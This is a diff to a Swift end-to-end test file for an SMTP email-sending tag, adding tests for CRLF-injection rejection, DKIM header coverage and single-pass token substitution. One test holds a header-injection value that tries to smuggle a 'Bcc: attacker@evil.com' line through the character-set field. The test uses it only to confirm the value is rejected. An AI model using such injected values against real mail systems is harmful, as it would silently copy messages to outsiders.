@@ -615,6 +615,51 @@ struct LassoPerfectSMTPEndToEndTests {
         #expect(output == "after")
     }
 
+    // MARK: - Phase F (§4.9c): `-characterSet` CRLF-injection rejection
+    //
+    // Milestone review finding (security pass, BLOCKING): the default
+    // (non-override) `Content-Type` construction path in
+    // `MIMEComposer.textLeaf` used to embed `EmailMessage.charset` (wired
+    // from `-characterSet` by `LassoSMTPMessageBuilder.build`) directly
+    // into the composed header with no CRLF-injection check at all --
+    // fixed on the Perfect-SMTP side (`MIMEComposer.textLeaf` now routes
+    // `charset` through the same `requireNoInjection` discipline
+    // `bodyContentTypeOverride` already used). This proves that fix is
+    // actually reachable end to end through the real `email_send` call
+    // path, not just at the Perfect-SMTP unit level -- a CRLF-laced
+    // `-characterSet` value must surface as a clear, `[protect]`-catchable
+    // error, never a live extra header smuggled into the sent message.
+    @Test func characterSetContainingCRLFIsRejectedAsACatchableComposeFailureNotSilentlyEmbedded() async throws {
+        let primaryRecorder = SendRecorder()
+        var context = try Self.makeContext(primaryRecorder: primaryRecorder)
+
+        let output = try await LassoRenderer().render(
+            "[protect][email_send: -to='a@example.com', -from='b@example.com', -subject='s', -body='b', " +
+            "-characterSet='utf-8\\r\\nBcc: attacker@evil.com'][/protect]after-[error_currenterror]",
+            context: &context
+        )
+
+        #expect(output.hasPrefix("after-"))
+        // No message was ever sent -- composition failed before the
+        // mailer's `send` was reached at all, so there is no serialized
+        // message that could have carried a live injected header.
+        #expect(primaryRecorder.sendCount == 0)
+    }
+
+    @Test func characterSetWithoutInjectionAttemptsStillComposesAndSendsNormally() async throws {
+        let primaryRecorder = SendRecorder()
+        var context = try Self.makeContext(primaryRecorder: primaryRecorder)
+
+        let output = try await LassoRenderer().render(
+            "[email_send: -to='a@example.com', -from='b@example.com', -subject='s', -body='b', -characterSet='iso-8859-1']",
+            context: &context
+        )
+
+        #expect(output == "")
+        let rfc5322 = String(decoding: primaryRecorder.lastMessage?.rfc5322 ?? [], as: UTF8.self)
+        #expect(rfc5322.contains("charset=iso-8859-1"))
+    }
+
     // MARK: - Phase F (§4.9a): DKIM signing
 
     /// A real 2048-bit RSA private key, reused verbatim from Perfect-SMTP's
@@ -726,6 +771,56 @@ struct LassoPerfectSMTPEndToEndTests {
         #expect(rfc5322.contains("DKIM-Signature: v=1; a=ed25519-sha256;"))
         #expect(rfc5322.contains("d=example.com"))
         #expect(rfc5322.contains("s=s1"))
+    }
+
+    /// Milestone review finding (Phase F review, protocol pass): a
+    /// `DKIMSigner` built once with `signedHeaders: []` (matching
+    /// `LassoSiteServer.makeDKIMSigner`'s real construction, `main.swift`)
+    /// relies entirely on `DKIMSigner.alwaysOversignedHeaders`, which does
+    /// NOT include caller-supplied `-extraMIMEHeaders` names -- those are
+    /// a per-message concern a signer built once at server startup can't
+    /// know in advance. Fixed on the Perfect-SMTP side
+    /// (`SMTPMailer.composeAndSign` now widens the configured `DKIMSigner`
+    /// with each message's own `extraHeaders` names right before signing,
+    /// via `DKIMSigner.signingAdditionalHeaders(_:)`) -- this proves that
+    /// actually happens through the real `email_send` call path, not just
+    /// at the Perfect-SMTP unit level.
+    @Test func extraMIMEHeadersAreCoveredByTheDKIMSignaturesHTagEvenThoughTheSignerWasBuiltWithAnEmptyBaseSet() async throws {
+        let signer = try DKIMSigner(
+            domain: "example.com",
+            selector: "s1",
+            signedHeaders: [],
+            keys: [try SigningKey.rsa(pem: Self.rsa2048PEM)]
+        )
+        let primaryRecorder = SendRecorder()
+        var context = try Self.makeContext(primaryRecorder: primaryRecorder, signer: signer)
+
+        let output = try await LassoRenderer().render(
+            """
+            [email_send: \
+            -to='a@example.com', \
+            -from='b@example.com', \
+            -subject='s', \
+            -body='b', \
+            -extraMIMEHeaders='X-Campaign-ID: spring-sale-42']
+            """,
+            context: &context
+        )
+
+        #expect(output == "")
+        let rfc5322 = String(decoding: primaryRecorder.lastMessage?.rfc5322 ?? [], as: UTF8.self)
+        let headerBlock = try #require(rfc5322.components(separatedBy: "\r\n\r\n").first)
+
+        // Sanity check: the custom header is genuinely present in the
+        // composed message.
+        #expect(headerBlock.contains("X-Campaign-ID: spring-sale-42"))
+        // The real assertion: the DKIM-Signature's own `h=` tag lists its
+        // name, proving it's covered by the signature, not just present
+        // alongside it.
+        let dkimLine = try #require(headerBlock.components(separatedBy: "\r\n").first { $0.hasPrefix("DKIM-Signature:") })
+        let hTag = try #require(dkimLine.components(separatedBy: "; ").first { $0.hasPrefix("h=") })
+        let signedNames = hTag.dropFirst("h=".count).split(separator: ":").map { $0.lowercased() }
+        #expect(signedNames.contains("x-campaign-id"))
     }
 
     // MARK: - Phase F (§4.9b): direct-MX relay selection
@@ -863,6 +958,42 @@ struct LassoPerfectSMTPEndToEndTests {
         let rfc5322 = String(decoding: primaryRecorder.lastMessage?.rfc5322 ?? [], as: UTF8.self)
         #expect(rfc5322.contains("Dear John,"))
         #expect(rfc5322.contains("#NeverResolved#"))
+    }
+
+    /// Milestone review finding (protocol pass): `substitute(_:tokens:)`
+    /// used to mutate one running `result` string in a sequential loop
+    /// over `tokens`, so a resolved token's VALUE that happened to
+    /// contain another token's literal marker text could get further
+    /// (incorrectly) substituted, depending on Swift `Dictionary`'s
+    /// unspecified iteration order. Here, token `A`'s resolved value is
+    /// itself the literal marker text `"#B#"` -- the fixed single-pass
+    /// implementation must emit that literal text unresolved, never
+    /// re-scanning it and resolving it to `B`'s own value.
+    @Test func aTokenValueThatIsItselfALiteralMarkerIsNotDoubleSubstituted() async throws {
+        let primaryRecorder = SendRecorder()
+        var context = try Self.makeContext(primaryRecorder: primaryRecorder)
+
+        let output = try await LassoRenderer().render(
+            """
+            [email_send: \
+            -to='john@example.com', \
+            -from='b@example.com', \
+            -subject='s', \
+            -body='Value of A is #A#, value of B is #B#.', \
+            -tokens=map('A'='#B#', 'B'='REAL VALUE')\
+            ]
+            """,
+            context: &context
+        )
+
+        #expect(output == "")
+        let rfc5322 = String(decoding: primaryRecorder.lastMessage?.rfc5322 ?? [], as: UTF8.self)
+        // `#A#` resolves to the literal text "#B#" -- which must survive
+        // unresolved, not be further substituted into "REAL VALUE".
+        #expect(rfc5322.contains("Value of A is #B#,"))
+        // The independent, genuine `#B#` marker elsewhere in the same
+        // text still resolves normally.
+        #expect(rfc5322.contains("value of B is REAL VALUE."))
     }
 
     @Test func ccTogetherWithTokensThrowsACatchablePreSendValidationError() async throws {
